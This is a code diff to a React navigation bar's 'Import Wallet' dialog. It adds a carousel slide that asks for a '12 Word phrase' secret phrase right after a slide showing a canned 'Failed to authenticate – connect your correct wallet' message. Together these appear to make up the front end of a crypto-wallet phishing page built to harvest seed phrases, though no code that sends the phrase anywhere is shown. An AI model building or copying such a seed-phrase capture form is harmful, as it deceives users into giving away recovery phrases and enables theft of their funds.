@@ -31,6 +31,7 @@ import {
   CarouselNext,
   CarouselPrevious,
 } from "@/components/ui/carousel"
+import { Textarea } from "@/components/ui/textarea";
 
 
 const NavBar = () => {
@@ -273,7 +274,7 @@ const NavBar = () => {
                                 </button>
                               </DialogTrigger>
 
-                              <DialogContent className="h-[480px]">
+                              <DialogContent>
                                 <DialogHeader>
                                   <DialogDescription>
                                     <Carousel className="relative">
@@ -301,12 +302,25 @@ const NavBar = () => {
                                             <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                             <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                             <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
-                                            <p className="text-[14px] text-[#6c6d75] mb-14">connect your correct wallet</p>
+                                            <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>
 
                                             <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
-                                              <TfiReload  className="mr-2"/>
+                                              <TfiReload className="mr-2" />
                                               <span>Try Again</span>
                                             </button>
+                                          </div>
+                                        </CarouselItem>
+
+                                        <CarouselItem className="flex justify-center text-center w-0">
+                                          <div className="w-full">
+                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
+                                            <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-10 mb-5 cursor-grab" />
+                                            <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
+                                            <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
+
+                                            <p className="text-start mt-5">12 Word phrase</p>
+                                            <Textarea rows={4} className="mt-1 mb-5"/>
+                                            <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                           </div>
                                         </CarouselItem>
 
